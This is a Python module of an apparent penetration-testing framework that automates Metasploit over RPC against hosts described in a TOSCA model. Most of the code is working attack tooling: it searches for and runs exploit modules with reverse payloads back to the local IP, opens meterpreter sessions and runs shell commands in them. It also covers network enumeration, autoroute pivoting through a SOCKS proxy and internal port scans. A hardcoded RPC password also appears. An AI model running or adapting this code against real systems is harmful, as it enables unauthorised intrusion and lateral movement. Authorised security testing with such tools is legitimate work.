import subprocess
import os
import pymetasploit3
from modules.command_interface import Command
import yaml
from libs.colors import Colors
from pymetasploit3.msfrpc import MsfRpcClient
import time
import socket
import re
import requests

global_filename = ''

class MSFindCommand(Command):
    def __init__(self, tosca_data, username = 'msf', password='Amd84H294hdJD389d', port=55552):

        self.tosca_data = tosca_data
        self.client = MsfRpcClient(password, port=port)

    @staticmethod
    def read_tosca_file(filename):
        with open(filename, 'r') as file:
            return yaml.safe_load(file)

    def search_vulnerability(self, app_name):
        console = self.client.consoles.console()
        console.write('search name:{}\n'.format(app_name))
        time.sleep(0)  # Adjust as necessary for your environment
          # Perform the search
        search_results = self.client.modules.search(app_name)
        print(search_results)

        if len(search_results) > 0:
            print("\n")
            print(Colors.GREEN+f"Exploits found: {len(search_results)}")

        # Filter and display the results for exploits
        vulnerabilities = []
        for result in search_results:
            # Check if the result is an exploit module
            exploit = ""
            for prop in result:
                exploit += Colors.GREEN+ f"{prop}: {result[prop]} | "
            vulnerabilities.append(result)
            print(f"{len(vulnerabilities)}. {exploit}")
        print("\n"+Colors.ENDC)
        
        # Return the list of exploit module names
        return vulnerabilities
        #search_results = console.read()
        #console.destroy()
        #print("Search results:")
        #print(search_results['data'])
    def select_vulnerability(self, vulnerabilities):
        selection = int(input("Select a vulnerability to exploit by number: ")) - 1
        if selection >= 0 and selection < len(vulnerabilities):
            return vulnerabilities[selection]
        else:
            print("Invalid selection.")
            return None
        
    def select_payload(self, payloads):
        choice = input("Select a payload by number (or press Enter to use the default): ")
        if choice.isdigit() and 1 <= int(choice) <= len(payloads):
            return payloads[int(choice) - 1]
        else:
            print("Using default payload.")
            return ''
        
    def list_payloads_via_console(self, exploit_fullname):
        console_id = self.client.consoles.console().cid
        self.client.consoles.console(console_id).write(f'use {exploit_fullname}\n')
        time.sleep(1)  # Give it a moment to load the exploit module
        self.client.consoles.console(console_id).write('show payloads\n')
        time.sleep(2)  # Wait for the command output to be ready
        payloads_output = self.client.consoles.console(console_id).read()['data']

        # Close the console after use
        self.client.consoles.destroy(console_id)
        
        # Parse the payloads from the output
        # This regex assumes payload names are well-structured and follow a consistent pattern
        payload_names = re.findall(r'\s+(?:exploit|payload)/([a-zA-Z0-9_/\-]+)', payloads_output)
        
        # Print and return the list of payload names
        if payload_names:
            for i, payload in enumerate(payload_names, 1):
                print(f"{i}. {payload}")
            return payload_names
        else:
            print("No payloads found.")
            return []

    def list_payloads(self, exploit_fullname):
        payloads = self.client.modules.compatible_payloads(exploit_fullname)
        print("\nAvailable payloads:")
        for i, payload in enumerate(payloads, 1):
            print(f"{i}. {payload}")

        # Assuming the first payload is the default (Metasploit does not directly provide a 'default' payload)
        # This assumption may not always be correct; adjust based on your requirements or further insights
        default_payload = payloads[0] if payloads else None
        print(f"\nDefault payload: {default_payload}")
        return payloads
    
    def determine_local_ip(self):
        myip = "10.0.1.0"
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Use Google's Public DNS server to find the best outgoing IP
            s.connect(("8.8.8.8", 80))
            # Get the socket's own address
            print("Local IP Address:", s.getsockname()[0])
            myip = s.getsockname()[0]
            # Close the socket
            s.close()
        except Exception as e:
            print("Could not determine local IP address:", e)
        return myip

        
    def execute_exploit(self, exploit, target_ip, target_port):
        
        myip = self.determine_local_ip()  # Implement this method to determine LHOST
        print(f"Exploit: {exploit['fullname']} on {target_ip}:{target_port}")
        selected_payload_fullname = ''

        exploit_module = self.client.modules.use('exploit', exploit['fullname'])
        exploit_module['RHOSTS'] = target_ip
        exploit_module['RPORT'] = target_port 

        print(exploit_module.targets)

        # List payloads and let the user select one
        select_pl = input("Do you want to select a payload (y/n)? :")
        if select_pl == 'y':
            payloads = self.list_payloads_via_console(exploit['fullname'])
            selected_payload_fullname = self.select_payload(payloads)
            payload_module = self.client.modules.use('payload', selected_payload_fullname)
            print("Selected payload: " + selected_payload_fullname)
        else:
            print("Using default payload")
      
        
        
        # Payload options - ensure these are set according to the payload's requirements
        p_options = {
            'LHOST': myip,
            'LPORT': 4444  # Adjust LPORT as necessary
        }
        confirm = 'n'

        while (confirm != 'y'):
            print("\n")
            print(Colors.WARNING+f"Detected RHOSTS: {target_ip}")
            print(f"Detected RPORT: {target_port}")
            print(f"Detected LHOST: {myip}")
            print(f"Detected LPORT: {4444}")
            print(f"Payload set: {selected_payload_fullname}")
            print("\n")

            confirm = input(f"{Colors.FAIL}Do you want to exploit using {exploit['fullname']}? (y/n): "+Colors.ENDC)

        #self.execute_auxiliary_module(self.client, exploit['fullname'], target_ip, target_port)
        
            
        if selected_payload_fullname != '':
            output = exploit_module.execute(payload=selected_payload_fullname, payload_options=p_options)
        else:
            output = exploit_module.execute(payload_options=p_options)

        print(output)
        print(Colors.WARNING + "Exploit executed, checking for sessions..."+Colors.ENDC)
            
        # Wait for a session to be created for up to one minute
        start_time = time.time() 
        timeout = 60
        session_id = None

        while True:
            sessions = self.client.sessions.list
            print(sessions)
            if sessions:
                print(Colors.GREEN + "Session opened." + Colors.ENDC)
                session_id = list(sessions.keys())[0]  # Get the first session ID
                break  # Exit the loop if a session is found
            elif time.time() - start_time > timeout:
                print(Colors.FAIL + "Timeout waiting for session." + Colors.ENDC)
                break  # Exit the loop if timeout is reached
            else:
                time.sleep(5)  # Wait for 5 seconds before checking again

        if session_id:
            print(Colors.CYAN + "Exploit successful, meterpreter session open" + Colors.ENDC)
            shell = self.client.sessions.session(session_id)
            output = shell.read()  # Read the command output
            print(output)
            while True:
                print(f'Available commands:\n\n{Colors.GREEN}pivot - sets autoroute and SOCKS proxy\nnetgather - get info on the target networks\nscan - initiate a network scan\nexit - exits the meterpreter session' + Colors.ENDC)
                command = input('Enter shell command: ')

                if command == 'exit':
                    break


                elif command == 'netgather':
                    output = self.execute_meterpreter_command(self.client, shell, 'use post/multi/gather/enum_network')

                elif command == 'pivot':
                    pivot_target = input('Set the subnet network for autoroute: ')
                    self.setup_autoroute_and_socks(self.client, session_id, pivot_target)

                elif command == 'scan':
                    print(Colors.GREEN+"Auxiliary Scan"+Colors.ENDC)
                    target = input("insert ip address to scan: ")
                    subnet = input("set subnet (e.g.24): ")
                    self.run_network_scan(self.client, shell, f'{target}/{subnet}')

                else:
                    shell.write(command)  # Execute a command in the session
                    time.sleep(2)  
                    print(shell.read())  

            while True:
                success = input("Was the exploit successful? (y/n)? :")
                if success == 'y':
                    return True
                else:
                    fail = input("Do you wish to go back to main module? (y/n)? :")
                    if fail == 'y':
                        return False
        else:
            print(Colors.FAIL + "No session was created." + Colors.ENDC)

    def execute_auxiliary_module(self, module, target_ip, target_port, options=None):
            
            myip = self.determine_local_ip()  # Implement this method to determine LHOST
            print(f"Auxiliary: {module['fullname']} on {target_ip}:{target_port}")
            
            #TODO: find why these are not working
            #auxiliary_module = self.client.modules.use('auxiliary', module['fullname'])
            # Set required options (example: RHOSTS)
            #auxiliary_module['RHOSTS'] = target_ip
            #auxiliary_module['RPORT'] = target_port
            #END TODO

            options = {}  # Initialize options as an empty dictionary
            while True:
                user_choice = input("Do you wish to set additional options (y/n)? : ")
                if user_choice.lower() == 'y':
                    opt_name = input("Enter option name: ")
                    opt_value = input("Enter value: ")
                    options[opt_name] = opt_value
                else:
                    break
            
            confirm = 'n'

            while (confirm != 'y'):
                print("\n")
                print(Colors.WARNING+f"Detected RHOSTS: {target_ip}")
                print(f"Detected RPORT: {target_port}")
                print(f"Detected LHOST: {myip}")
                if options:
                    for option, value in options.items():
                        print(f"Detected Option: set {option} {value}\n")
                print("\n")

                confirm = input(f"{Colors.FAIL}Do you want to exploit using {module['fullname']}? (y/n): "+Colors.ENDC)

            # Execute the module through a console
            cid = self.client.consoles.console().cid
            console = self.client.consoles.console(cid)
            
            # Build the command to execute the module with options
            command = f"use {module['fullname']}\n"
            command += f"set RHOSTS {target_ip}\n"
            command += f"set RPORT {target_port}\n"
            if options:
                for option, value in options.items():
                    command += f"set {option} {value}\n"
            command += "run\n"
            
            console.write(command)
            #todo: insert a mechanism to periodically check the job completion
            time.sleep(60)  
            console_output = console.read()['data']
            print(console_output)

            while True:
                success = input("Was the exploit successful? (y/n)? :")
                if success == 'y':
                    return True
                else:
                    fail = input("Do you wish to go back to main module? (y/n)? :")
                    if fail == 'y':
                        return False

    def setup_autoroute_and_socks(self, client, session_id, subnet, netmask='255.255.255.0', srvhost='127.0.0.1', srvport=1080):
        # Setup Autoroute
        autoroute_cmd = f"use post/multi/manage/autoroute\nset ACTION add\nset SESSION {session_id}\nset SUBNET {subnet}\nset NETMASK {netmask}\nrun"
        autoroute_response = client.consoles.console().write(autoroute_cmd)
        # Placeholder for checking autoroute_response for success or failure
        print(f"[+] Setting up autoroute for {subnet}")
        time.sleep(5)  # Consider a more reliable way to ensure the command has completed
        
        # Setup SOCKS Proxy
        socks_cmd = f"use auxiliary/server/socks_proxy\nset SRVHOST {srvhost}\nset SRVPORT {srvport}\nrun"
        socks_response = client.consoles.console().write(socks_cmd)
        # Placeholder for checking socks_response for success or failure
        print(f"[+] Starting SOCKS proxy on {srvhost}:{srvport}")

    def execute_meterpreter_command(self, client, shell, command):
            console_id = client.consoles.console().cid
            s = shell
            client.consoles.console(console_id).write(f"{command}\nrun\n")
            print(f"Execute command {command}")
            output = ""
            time.sleep(15)
            output = client.consoles.console(console_id).read()['data']
            print(output)

    def run_network_scan(self, client, shell, subnet):
            console_id = client.consoles.console().cid
            s = shell
            scan_command = f"use auxiliary/scanner/portscan/tcp\nset RHOSTS {subnet}\nset THREADS 10\nrun\n"
            client.consoles.console(console_id).write(scan_command)
            print(Colors.WARNING+"\nScanning, please wait..."+Colors.ENDC)
            time.sleep(1)
            output = ""
            start_time = time.time()
            last_match_time = time.time()  # Keep track of the last match time
            pattern = re.compile(r"^\[\+\].*", re.MULTILINE)
            acc_output = ''
            results = []
            
            while True:
                # Read the current output
                out = client.consoles.console(console_id).read()['data']
                acc_output += out
                # Check for the pattern in the accumulated output
                if pattern.search(acc_output):
                    # Extract all matches to the pattern (lines starting with [+])
                    new_results = self.parse_scan_results(acc_output)
                    for result in new_results:
                        if result not in results:  # Check for new matches
                            print('Host found: ' + result)
                            results.append(result)  # Add new result to the list
                            last_match_time = time.time()  # Update the last match time
                            
                # If no new match is found in 60 seconds, consider the scan completed
                if (time.time() - last_match_time) > 3000:
                    print("Scan completed")
                    print(acc_output)
                    break
                
                # Also break if overall time exceeds 300 seconds
                if (time.time() - start_time) > 600:
                    print("Scan timeout reached")
                    print("Scan completed")
                    break
                
                time.sleep(2)
            
            print(results)
            add_info = input("Do you want to gather more info about scanned hosts (y/n) ? ")
            if add_info == 'y':
                for result in results:
                    # Attempt to fetch the web page
                    proxy = {'http': 'socks5h://127.0.0.1:1080', 'https': 'socks5h://127.0.0.1:1080'}
                    text = self.fetch_webpage_via_proxy('http://'+result, proxy)
                    if text != None:
                        print ("Result: "+ text)
                        add = input("Do you want to add this host as pts_webapp on TOSCA template (y/n)? ")
                        if add == 'y':
                            self.add_host_to_tosca(result)
                            self.add_webapp_to_tosca(result)
 
    def fetch_webpage_via_proxy(self, url, proxy):
        try:
            response = requests.get(url, proxies=proxy, timeout=10)
            return response.text if response.status_code == 200 else None
        except requests.exceptions.RequestException as e:
            print(f"Error fetching the web page: {e}")
            return None
        
    def parse_scan_results(self, output):
        # Add regex to match.
        pattern = r"\[\+\] (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):.*?(\d+) - TCP OPEN"
        matches = re.findall(pattern, output)
        # designed to capture two separate groups (IP and port)
        combined_matches = [f"{ip}:{port}" for ip, port in matches]
        return combined_matches
    
    def add_host_to_tosca(self, webapp):
        # Create compute node
        tosca_template = self.read_tosca_file(global_filename)
        ip, port = webapp.split(':')
        compute_node = {
            'type': 'pts_compute',
            'properties': {
                'os': {'name': 'Unknown'},
                 'ip': ip,
                'open_ports': port
            }
        }
        tosca_template['topology_template']['node_templates'][f"host_ms_1"] = compute_node

        with open(global_filename, 'w') as file:
            yaml.dump(tosca_template, file, sort_keys=False)
        print(f"{Colors.ENDC}Host saved to '{global_filename}'")
    
    def add_webapp_to_tosca(self, webapp):
        tosca_template = self.read_tosca_file(global_filename)
        ip, port = webapp.split(':')
        port = int(port)
        webapp_node = {
            'type': 'pts_webapp',
            'properties': {
                'ip': ip,
                'port_number': port,
                'app_name' : '',
                'app_version' : ''
            },
            'requirements': [{
                'host': {
                    'node': f"host_ms_1",
                    'relationship': 'hosted_on'
                }
            }]
        }
        # Add the webapp_node to the TOSCA template
        tosca_template['topology_template']['node_templates'][f"wa_host_ms_1:{port}"] = webapp_node

        with open(global_filename, 'w') as file:
            yaml.dump(tosca_template, file, sort_keys=False)
        print(f"{Colors.ENDC}Webapp saved to '{global_filename}'")

    def add_vulnerability_to_tosca(self, host, app_name, vulnerability):

        print(vulnerability)

        host = {
                'node' : host,
                'relationship': 'hosted_on'
        }
          
        properties = {
            'description' : vulnerability,
            'confirmed' : 'false',
            'host' : host
        }

        vuln_node = {
            'type': 'pts_vulnerability',
            'properties': properties,
            'requirements': host
        }

        tosca_template = self.read_tosca_file(global_filename)
        vuln_key = f"{app_name}_vulnerability"
        tosca_template['topology_template']['node_templates'][vuln_key] = vuln_node

        with open(global_filename, 'w') as file:
            yaml.dump(tosca_template, file, sort_keys=False)
        print(f"Vulnerability '{vuln_key}' added to TOSCA template.")

        return vuln_key

    def add_exploit_to_tosca(self, node_name, exploit, vulnerability):
        tosca_template = self.read_tosca_file(global_filename)

        type = exploit['type']
        disclosuredate = exploit['disclosuredate']
        name = exploit['name']
        description = exploit['fullname']
       # Create a new vulnerability node
        exploit_node = {
            'type': 'pts_exploit',
            'properties': {
                'description': f"{name} {description}",
                'platform': f"Metasploit {type}",
                'date': disclosuredate,
                'host': vulnerability,
            },
            'requirements': [{
                'host': {
                    'node': node_name,
                    'relationship': 'tosca.relationships.HostedOn'
                }
            }]
        }

        # Add the Exploit to the TOSCA template
        tosca_template['topology_template']['node_templates'][f"wa_host_ms_1:{description}"] = exploit_node
        
        # Check if the associated vulnerability exists in the topology
        topology_nodes = tosca_template.get('topology_template', {}).get('node_templates', {})
        if vulnerability not in topology_nodes:
            print(f"Node '{vulnerability}' not found in the topology.")
            return

        # Node exists, proceed to edit
        existing_node = topology_nodes[vulnerability]
        print(f"Found node '{vulnerability}' of type '{existing_node['type']}'.")

        # Set confirmed = true
        properties = existing_node.get('properties', {})
        for prop in properties.keys():
            if prop == 'confirmed':
                properties[prop] = 'true'

        # Update the vulnerability node
        tosca_template['topology_template']['node_templates'][vulnerability]['properties'] = properties

        with open(global_filename, 'w') as file:
            yaml.dump(tosca_template, file, sort_keys=False)
        print(f"{Colors.GREEN}Exploit saved to '{global_filename}{Colors.ENDC}'")

    def execute(self, node_name, target, filename):
        tosca_template = self.read_tosca_file(filename)
        node = tosca_template['topology_template']['node_templates'].get(node_name)
        global global_filename 
        global_filename = filename
        print("Tosca file: " + global_filename)
        target_ip = target['properties']['ip']
        target_port = target['properties']['port_number']

        if node and node.get('type') == 'pts_webapp':
            app_name = node['properties'].get('app_name')
            print(f"Searching vulnerabilities for: {app_name}")

            # Step 1: Search for vulnerabilities
            vulnerabilities = self.search_vulnerability(app_name)
            # Step 2: Select a vulnerability
            exploit = self.select_vulnerability(vulnerabilities)

            print(f"{Colors.GREEN}adding vulnerability to TOSCA{Colors.ENDC}")
            vulnerability = self.add_vulnerability_to_tosca(node_name, app_name, exploit['name'])

            if exploit:
            # Step 3: Execute the exploit
                print(f"Trying: {exploit['fullname']} (type: {exploit['type']})")
                if exploit['type'] == 'exploit':
                    try:
                        exploit_output = self.execute_exploit(exploit, target_ip, target_port)
                        if exploit_output == True:
                            success = input("Do you want to add the exploit to TOSCA file (y/n)? :")
                            if success == 'y':
                                self.add_exploit_to_tosca(node_name, exploit, vulnerability)
                    except Exception as e:
                        print(f"An error occurred: {e}")
                elif exploit['type'] == 'auxiliary':
                    try:
                        exploit_output = self.execute_auxiliary_module(exploit, target_ip, target_port)
                        if exploit_output == True:
                            success = input("Do you want to add the exploit to TOSCA file (y/n)? :")
                            if success == 'y':
                                self.add_exploit_to_tosca(node_name, exploit, vulnerability)
                    except Exception as e:
                        print(f"An error occurred: {e}")
            else:
                print("No exploit executed.")
        else:
            print("Invalid node type or node not found.")
